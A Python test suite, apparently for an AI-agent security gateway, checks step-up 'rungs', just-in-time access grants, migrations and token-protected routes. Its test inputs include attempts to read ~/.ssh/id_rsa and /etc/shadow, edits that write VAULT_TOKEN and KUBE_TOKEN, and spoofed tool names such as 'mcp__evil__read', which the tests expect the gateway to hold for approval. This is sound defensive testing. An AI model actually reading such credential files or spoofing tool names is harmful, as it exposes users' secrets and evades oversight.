        if guard == "allow" and tool in ("Bash", "WebFetch"):
            guard = "needs_approval" if _egress(gw, tool, tool_input, "s-act")["action"] == "block" else "allow"
        answer, _ = asyncio.run(policy_check.decide(gw.db, tool, tool_input, harness=HARNESS,
                                                    harness_session_id="s-act", verified=False))
        assert answer == guard, (tool, answer, guard)


def test_rung_change_writes_a_task_event_without_arguments(world):
    tid = world.task("s-ev", ended=False)
    task = {"id": tid, "executor_id": HARNESS}
    for n in (1, 2):
        res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, f"c{n}")
        asyncio.run(rr.evaluate(world.db, "s-ev", task=task, result=res))
    ev = world.one("SELECT kind, origin, detail FROM terminal_events WHERE task_id = ?", (tid,))
    assert ev == ("rung", "rung", "step-up (shadow): drift high")


# --- part 2 routes --------------------------------------------------------------------


def _route_env(tmp_path):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from securevector.app.terminals import routes
    from securevector.app.terminals.auth import TerminalAuth
    from securevector.app.terminals.store import TerminalStore

    db = DatabaseConnection(tmp_path / "r.db")
    asyncio.run(run_migrations(db))
    store = TerminalStore(db)
    asyncio.run(store.create_task("t-r", executor_id=HARNESS, workspace="/w/app", title=None, pid=None,
                                  session_id="s-r"))
    manager = type("M", (), {"store": store})()
    app = FastAPI()
    app.state.terminal_auth = TerminalAuth(token="t" * 48, port=8741)
    app.state.terminal_manager = manager
    app.include_router(routes.router, prefix="/api")
    client = TestClient(app, base_url="http://127.0.0.1:8741")
    client.get("/api/terminals/session")
    return client, db


def test_mutating_routes_refuse_without_the_token(tmp_path):
    from securevector.app.terminals.auth import HEADER

    client, _db = _route_env(tmp_path)
    bare = client.__class__(client.app, base_url="http://127.0.0.1:8741")
    auth = {HEADER: "1", "Origin": "http://127.0.0.1:8741"}
    from securevector.app.server.routes.jit_access import _UI_TOKEN

    ui = {**auth, "X-SV-UI-Token": _UI_TOKEN}
    assert bare.post("/api/terminals/tasks/t-r/rung/release", headers=ui).status_code == 403
    assert bare.post("/api/terminals/tasks/t-r/rung/feedback", headers=ui, json={}).status_code == 403
    assert client.post("/api/terminals/tasks/t-r/rung/release", headers={HEADER: "1"}).status_code == 403
    # Every mutating rung route also needs the per-run UI token.
    assert client.post("/api/terminals/tasks/t-r/rung/release", headers=auth).status_code == 403
    assert client.post("/api/terminals/tasks/t-r/rung/feedback", headers=auth, json={}).status_code == 403
    assert client.post(f"/api/terminals/rungs/modes/{HARNESS}", headers=auth,
                       json={"mode": "shadow"}).status_code == 403
    assert client.post("/api/terminals/tasks/t-r/rung/release", headers={**auth, "X-SV-UI-Token": "x"}).status_code == 403


def test_active_mode_is_refused_until_shadow_completes(tmp_path):
    from securevector.app.server.routes.jit_access import _UI_TOKEN
    from securevector.app.terminals.auth import HEADER

    client, db = _route_env(tmp_path)
    auth = {HEADER: "1", "Origin": "http://127.0.0.1:8741", "X-SV-UI-Token": _UI_TOKEN}
    url = f"/api/terminals/rungs/modes/{HARNESS}"
    assert client.post(url, headers=auth, json={"mode": "active"}).status_code == 409
    assert client.post(url, headers=auth, json={"mode": "shadow"}).status_code == 200
    assert client.post(url, headers=auth, json={"end_shadow_early": True}).json()["can_activate"] is True
    r = client.post(url, headers=auth, json={"mode": "active"})
    assert r.status_code == 200 and r.json()["mode"] == "active"
    assert client.post(url, headers=auth, json={"mode": "shadow", "end_shadow_early": True}).status_code == 422
    assert client.post("/api/terminals/rungs/modes/nope", headers=auth, json={"mode": "shadow"}).status_code == 404
    ev = sqlite3.connect(db.db_path).execute(
        "SELECT kind, origin, detail FROM terminal_events WHERE task_id = 't-r' ORDER BY seq DESC").fetchone()
    assert ev == ("rung", "ui", "mode: active")
    chain = asyncio.run(CustomToolsRepository(db).verify_audit_chain())
    assert chain["ok"] is True, chain


def test_release_and_feedback_routes(tmp_path):
    from securevector.app.server.routes.jit_access import _UI_TOKEN
    from securevector.app.terminals.auth import HEADER

    client, db = _route_env(tmp_path)
    auth = {HEADER: "1", "Origin": "http://127.0.0.1:8741", "X-SV-UI-Token": _UI_TOKEN}
    assert client.post("/api/terminals/tasks/t-r/rung/release", headers=auth).status_code == 409
    asyncio.run(ResponseRungsRepository(db).upsert(
        "s-r", "t-r", HARNESS, "active", rr.RungState(rung=3, peak_rung=3), "2026-10-09T12:00:00", False))
    r = client.post("/api/terminals/tasks/t-r/rung/release", headers=auth)
    assert r.status_code == 200 and r.json()["rung"] == 1 and r.json()["pinned"] is True
    r = client.post("/api/terminals/tasks/t-r/rung/feedback", headers=auth, json={"feedback": "not_needed"})
    assert r.status_code == 200
    assert asyncio.run(ResponseRungsRepository(db).get("s-r"))["feedback"] == "not_needed"
    assert client.post("/api/terminals/tasks/t-r/rung/feedback", headers=auth,
                       json={"feedback": "other"}).status_code == 422
    assert client.post("/api/terminals/tasks/t-r/rung/feedback", headers=auth, json={"feedback": None}).status_code == 200


def test_v59_lets_jit_requests_carry_rung_and_keeps_rows(tmp_path):
    from securevector.app.database.migrations import ensure_rung_rule_source

    path = tmp_path / "old.db"
    raw = sqlite3.connect(path)
    raw.executescript(
        "CREATE TABLE jit_access_requests (id TEXT PRIMARY KEY, tool_id TEXT NOT NULL, function_name TEXT, "
        "runtime_kind TEXT, session_id TEXT, trace_id TEXT, justification TEXT, "
        "rule_source   TEXT NOT NULL CHECK (rule_source IN ('synced', 'local')), "
        "requested_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, status TEXT NOT NULL DEFAULT 'pending', "
        "decided_at TIMESTAMP, decided_by TEXT, deny_reason TEXT);"
        "CREATE TABLE jit_access_grants (id TEXT PRIMARY KEY, request_id TEXT NOT NULL "
        "REFERENCES jit_access_requests(id), tool_id TEXT NOT NULL, runtime_kind TEXT, session_id TEXT, "
        "duration TEXT NOT NULL, granted_at TIMESTAMP, expires_at TIMESTAMP, revoked_at TIMESTAMP);"
        "INSERT INTO jit_access_requests (id, tool_id, rule_source) VALUES ('r1', 'Bash', 'local');"
        "INSERT INTO jit_access_grants (id, request_id, tool_id, duration) VALUES ('g1', 'r1', 'Bash', '1h');"
    )
    raw.commit()
    raw.close()
    db = DatabaseConnection(path)
    asyncio.run(ensure_rung_rule_source(db))
    asyncio.run(ensure_rung_rule_source(db))  # idempotent
    raw = sqlite3.connect(path)
    try:
        assert raw.execute("SELECT id, rule_source FROM jit_access_requests").fetchall() == [("r1", "local")]
        raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source) VALUES ('r2', 'Bash', 'rung')")
        with pytest.raises(sqlite3.IntegrityError):
            raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source) VALUES ('r3', 'x', 'other')")
        assert raw.execute("PRAGMA foreign_key_check").fetchall() == []
        assert "jit_access_requests" in raw.execute(
            "SELECT sql FROM sqlite_master WHERE name = 'jit_access_grants'").fetchone()[0]
    finally:
        raw.close()


# --- part 2 follow-ups ------------------------------------------------------------------


@pytest.mark.parametrize("tool_id", ["*", "", "  ", "egress:x.example", "EGRESS:x", "sv.response_rung",
                                     "securevector:check_policy", "mcp__securevector__check_policy", "a*b"])
def test_run_wide_host_empty_and_app_ids_are_never_in_the_class(tool_id):
    assert rr.step_up_kind(tool_id, {"file_path": "~/.ssh/id_rsa"}, baseline_tools=set()) is None


def test_ineligible_ids_are_never_held_filed_or_granted(gw):
    from securevector.app.database.repositories.jit_access import JitAccessRepository

    _at_rung(gw, "s-act", "active")
    for tool_id in ("*", "egress:x.example", "", "sv.response_rung"):
        assert asyncio.run(rr.holds_tool(gw.db, "s-act", tool_id)) is False
        assert asyncio.run(rr.file_request(gw.db, tool_id, None, HARNESS, "s-act")) is None
    gw.raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source, session_id, runtime_kind) "
                   "VALUES ('rq-star', '*', 'rung', 's-act', ?)", (HARNESS,))
    gw.raw.commit()
    with pytest.raises(ValueError):
        asyncio.run(JitAccessRepository(gw.db).approve_request("rq-star", "session"))
    assert gw.one("SELECT COUNT(*) FROM jit_access_grants")[0] == 0


def test_run_exemption_and_host_grants_ignore_rung_grants(gw):
    from securevector.app.database.repositories.jit_access import JitAccessRepository
    from securevector.app.services.run_limits import has_run_exemption

    for rid, tool, source in (("rq-r1", "*", "rung"), ("rq-r2", "egress:new.example", "rung"),
                              ("rq-l1", "egress:ok.example", "local")):
        gw.raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source, session_id, runtime_kind, "
                       "status) VALUES (?, ?, ?, 's-x', ?, 'approved')", (rid, tool, source, HARNESS))
        gw.raw.execute("INSERT INTO jit_access_grants (id, request_id, tool_id, runtime_kind, session_id, duration, "
                       "expires_at) VALUES (?, ?, ?, ?, 's-x', 'session', datetime('now', '+1 hour'))",
                       (f"g-{rid}", rid, tool, HARNESS))
    gw.raw.commit()
    assert asyncio.run(has_run_exemption(gw.db, HARNESS, "s-x")) is False
    hosts = asyncio.run(JitAccessRepository(gw.db).active_host_grants("s-x", HARNESS))
    assert set(hosts) == {"ok.example"}
    gw.raw.execute("UPDATE jit_access_requests SET rule_source = 'local' WHERE id = 'rq-r1'")
    gw.raw.commit()
    assert asyncio.run(has_run_exemption(gw.db, HARNESS, "s-x")) is True


def _old_jit_db(path, rows=1):
    raw = sqlite3.connect(path)
    raw.executescript(
        "CREATE TABLE jit_access_requests (id TEXT PRIMARY KEY, tool_id TEXT NOT NULL, function_name TEXT, "
        "runtime_kind TEXT, session_id TEXT, trace_id TEXT, justification TEXT, "
        "rule_source   TEXT NOT NULL CHECK (rule_source IN ('synced', 'local')), "
        "requested_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, status TEXT NOT NULL DEFAULT 'pending', "
        "decided_at TIMESTAMP, decided_by TEXT, deny_reason TEXT);"
        "CREATE TABLE jit_access_grants (id TEXT PRIMARY KEY, request_id TEXT NOT NULL "
        "REFERENCES jit_access_requests(id), tool_id TEXT NOT NULL, runtime_kind TEXT, session_id TEXT, "
        "duration TEXT NOT NULL, granted_at TIMESTAMP, expires_at TIMESTAMP, revoked_at TIMESTAMP);"
    )
    for i in range(rows):
        raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source) VALUES (?, 'Bash', 'local')",
                    (f"r{i}",))
    raw.commit()
    return raw


def _staged_copy(raw):
    """What an earlier run that stopped after copying would leave."""
    sql = raw.execute("SELECT sql FROM sqlite_master WHERE name = 'jit_access_requests'").fetchone()[0]
    raw.execute(sql.replace("('synced', 'local')", "('synced', 'local', 'rung')")
                .replace("jit_access_requests (", "jit_access_requests_v59 (", 1))
    raw.execute("INSERT INTO jit_access_requests_v59 SELECT * FROM jit_access_requests")
    raw.commit()


@pytest.mark.parametrize("left", ["main_missing", "main_empty", "both_full"])
def test_v59_rerun_finishes_from_a_staged_copy(tmp_path, left):
    from securevector.app.database.migrations import ensure_rung_rule_source

    path = tmp_path / f"{left}.db"
    raw = _old_jit_db(path, rows=2)
    _staged_copy(raw)
    raw.execute("PRAGMA foreign_keys = OFF")
    if left == "main_missing":
        raw.execute("DROP TABLE jit_access_requests")
    elif left == "main_empty":
        raw.execute("DELETE FROM jit_access_requests")
    raw.commit()
    raw.close()
    db = DatabaseConnection(path)
    asyncio.run(ensure_rung_rule_source(db))
    asyncio.run(ensure_rung_rule_source(db))
    raw = sqlite3.connect(path)
    try:
        names = {r[0] for r in raw.execute("SELECT name FROM sqlite_master WHERE type = 'table'")}
        assert "jit_access_requests_v59" not in names
        assert raw.execute("SELECT COUNT(*) FROM jit_access_requests").fetchone()[0] == 2
        raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source) VALUES ('rx', 'Bash', 'rung')")
        assert raw.execute("PRAGMA foreign_key_check").fetchall() == []
        assert raw.execute("SELECT 1 FROM sqlite_master WHERE name = 'idx_jit_requests_status'").fetchone()
    finally:
        raw.close()


def test_release_and_evaluate_never_interleave(tmp_path):
    w = World(tmp_path)
    try:
        task = {"id": "t1", "executor_id": HARNESS}
        for n in range(1, 3):
            res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, f"c{n}")
            asyncio.run(rr.evaluate(w.db, "s-race", task=task, result=res))
        assert asyncio.run(ResponseRungsRepository(w.db).get("s-race"))["rung"] == 3

        async def race(n):
            res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, f"c{n}")
            await asyncio.gather(rr.evaluate(w.db, "s-race", task=task, result=res),
                                 rr.release_session(w.db, "s-race"),
                                 rr.evaluate(w.db, "s-race", task=task, result=res))

        for n in range(3, 8):
            asyncio.run(race(n))
            row = asyncio.run(ResponseRungsRepository(w.db).get("s-race"))
            assert row["pinned"] == 1 and row["rung"] == 1
        assert rr._SESSION_LOCKS == {}
    finally:
        w.raw.close()


def test_rung_rows_need_both_runtime_and_session(gw):
    from securevector.app.server.routes import tool_permissions as tp

    _at_rung(gw, "s-act", "active")
    rows = asyncio.run(tp.get_synced_overrides(runtime=None, session_id="s-act"))["synced"]
    assert not [r for r in rows if str(r.get("source", "")).startswith("rung")]
    assert [r for r in _rows(gw, "s-act") if r.get("source") == "rung_marker"]


def test_marker_row_in_active_mode_only(gw):
    _at_rung(gw, "s-act", "active")
    _at_rung(gw, "s-sh", "shadow")
    marker = rr.find_marker(_rows(gw, "s-act"), "s-act")
    assert marker["tool_id"] == rr.MARKER_ID and marker["effect"] == "marker"
    sp = marker["step_up"]
    assert "/.ssh/" in sp["paths"] and "KUBE_TOKEN" in sp["env_keys"] and "read" in sp["known_tools"]
    assert rr.find_marker(_rows(gw, "s-sh"), "s-sh") is None
    assert rr.find_marker(_rows(gw, "s-act"), "s-sh") is None


def test_check_policy_holds_file_tools_and_never_seen_tools_at_rung_three(gw):
    from securevector.app.services import policy_check

    _at_rung(gw, "s-act", "active")

    def answer(tool, tool_input, sid="s-act"):
        return asyncio.run(policy_check.decide(gw.db, tool, tool_input, harness=HARNESS, harness_session_id=sid,
                                               verified=False, mcp_endpoint="https://pypi.org/mcp"))[0]

    assert answer("Read", {"file_path": "/Users/u/.ssh/id_rsa"}) == "needs_approval"
    assert answer("Edit", {"file_path": "a.env", "new_string": "VAULT_TOKEN=1"}) == "needs_approval"
    assert answer("Grep", {"pattern": "x", "path": "/etc/shadow"}) == "needs_approval"
    assert answer("Read", {"file_path": "src/app.py"}) == "allow"
    assert answer("mcp__zz__fresh_tool", {}) == "needs_approval"
    assert answer("mcp__securevector__check_policy", {}) == "allow"
    _at_rung(gw, "s-calm", "active", rung=1)
    assert answer("Read", {"file_path": "/Users/u/.ssh/id_rsa"}, sid="s-calm") == "allow"


def test_check_policy_marker_matches_the_guard_hook(gw):
    import shutil
    import subprocess
    from pathlib import Path

    if shutil.which("node") is None:
        pytest.skip("node is not installed")
    _at_rung(gw, "s-act", "active")
    marker = rr.find_marker(_rows(gw, "s-act"), "s-act")
    cases = [["Read", {"file_path": "/Users/u/.ssh/id_rsa"}, False], ["Read", {"file_path": "a.py"}, False],
             ["Edit", {"new_string": "export KUBE_TOKEN=1"}, False], ["Edit", {"new_string": "MY_KUBE_TOKENS"}, False],
             ["mcp__zz__fresh", {}, False], ["mcp__zz__fresh", {}, True], ["Glob", {"pattern": "C:\\Windows\\x"}, False],
             ["Read", {"nested": {"PRIVATE_KEY": ["x"]}}, False], ["mcp__securevector__check_policy", {}, False],
             ["mcp__evil__read", {}, False], ["MCP__Evil__Grep", {}, False]]
    hook = Path(__file__).resolve().parents[3] / "src/securevector/plugins/claude-code/hooks/pre-tool-use.js"
    script = ("const m=require(process.argv[1]);const d=JSON.parse(require('fs').readFileSync(0,'utf8'));"
              "process.stdout.write(JSON.stringify(d.cases.map(c=>m.stepUpFromMarker(c[0],c[1],d.marker,c[2]))));")
    out = subprocess.run(["node", "-e", script, str(hook)], input=json.dumps({"marker": marker, "cases": cases}),
                         capture_output=True, text=True, timeout=30, check=True)
    js = json.loads(out.stdout)
    py = [rr.marker_kind(t, i, marker, m) for t, i, m in cases]
    assert js == py, (js, py)
    assert py[0] == rr.KIND_PATH and py[1] is None and py[4] == rr.KIND_NEW_TOOL and py[5] is None


def test_a_new_server_never_borrows_a_baseline_tools_short_name():
    assert rr.step_up_kind("mcp__evil__read", baseline_tools={"Read"}) == rr.KIND_NEW_TOOL
    assert rr.step_up_kind("mcp__srv__x", baseline_tools={"mcp__srv__x"}) is None
    assert rr.step_up_kind("mcp__srv__x", baseline_tools={"srv:x"}) is None
    assert rr.step_up_kind("MCP__Srv__X", baseline_tools={"SRV:x"}) is None
    assert rr.step_up_kind("mcp__srv__x", baseline_tools={"x"}) == rr.KIND_NEW_TOOL
    marker = {"step_up": {"paths": [], "env_keys": [], "known_tools": ["read"], "granted": []}}
    assert rr.marker_kind("mcp__evil__read", {}, marker, False) == rr.KIND_NEW_TOOL
    marker["step_up"]["known_tools"] = ["srv:x"]
    assert rr.marker_kind("mcp__srv__x", {}, marker, False) is None


def test_a_malformed_marker_is_ignored():
    for sp in ({"paths": "/.ssh/", "env_keys": 5, "known_tools": "read", "granted": {}}, [], None, "x"):
        assert rr.marker_kind("Read", {"file_path": "/u/.ssh/id"}, {"step_up": sp}, False) is None
    assert rr.marker_kind("Read", {}, {"step_up": {"paths": [None, 3], "known_tools": [None]}}, False) \
        == rr.KIND_NEW_TOOL
    assert rr.marker_kind("Read", {}, "not a row", False) is None


def test_the_marker_row_is_never_a_rule(gw):
    from securevector.app.services import policy_check

    _at_rung(gw, "s-act", "active")
    rows = _rows(gw, "s-act")
    for cands in (["x:_rung_step_up", "_rung_step_up"], [rr.MARKER_ID], ["x:" + rr.MARKER_ID]):
        assert policy_check.decide_from_overrides(cands, rows, "s-act") == ("allow", False)
        assert rr._verdict_allows(cands[0], rows, "s-act") is True
    answer, _ = asyncio.run(policy_check.decide(gw.db, "mcp__x___rung_step_up", {}, harness=HARNESS,
                                                harness_session_id="s-act", verified=False,
                                                mcp_endpoint="https://pypi.org/mcp"))
    assert answer == "needs_approval"


def test_a_rung_grant_does_not_count_as_approval_after_a_deny(gw):
    from securevector.app.database.repositories.policy_decisions import PolicyDecisionsRepository

    since = "2020-01-01T00:00:00"
    gw.raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source, session_id, status) "
                   "VALUES ('rq-r', 'Bash', 'rung', 's-x', 'approved')")
    gw.raw.execute("INSERT INTO jit_access_grants (id, request_id, tool_id, session_id, duration, granted_at) "
                   "VALUES ('g-r', 'rq-r', 'Bash', 's-x', 'session', CURRENT_TIMESTAMP)")
    gw.raw.commit()
    repo = PolicyDecisionsRepository(gw.db)
    assert asyncio.run(repo.approved_since("s-x", HARNESS, since)) is False
    gw.raw.execute("INSERT INTO jit_access_requests (id, tool_id, rule_source, session_id, status) "
                   "VALUES ('rq-l', 'Bash', 'local', 's-x', 'approved')")
    gw.raw.execute("INSERT INTO jit_access_grants (id, request_id, tool_id, session_id, duration, granted_at) "
                   "VALUES ('g-l', 'rq-l', 'Bash', 's-x', 'session', CURRENT_TIMESTAMP)")
    gw.raw.commit()
    assert asyncio.run(repo.approved_since("s-x", HARNESS, since)) is True


def test_payload_carries_would_ask(world):
    assert rr.payload(None).get("would_ask", 0) == 0
    row = {"rung": 3, "mode": "shadow", "reasons_json": "[]", "would_ask": 4}
    assert rr.payload(row)["would_ask"] == 4
    assert rr.payload({**row, "would_ask": None})["would_ask"] == 0


def test_board_items_carry_the_stored_rung_and_a_read_writes_nothing(world):
    from securevector.app.terminals import routes

    repo = ResponseRungsRepository(world.db)
    asyncio.run(repo.upsert("s-a", None, HARNESS, "shadow", rr.RungState(rung=3, peak_rung=3), rr._iso(T0), False))
    items = [{"session_id": "s-a"}, {"session_id": "s-none"}, {"id": "no-session"}]

    class _Store:
        db = world.db

    class _Mgr:
        store = _Store()

    before = world.one("SELECT COUNT(*) FROM session_rungs")[0]
    asyncio.run(routes._with_rung(_Mgr(), items))
    assert items[0]["rung_word"] == "step-up" and items[0]["rung_mode"] == "shadow"
    assert "rung_word" not in items[1] and "rung_mode" not in items[1]
    assert "rung_word" not in items[2]
    assert world.one("SELECT COUNT(*) FROM session_rungs")[0] == before
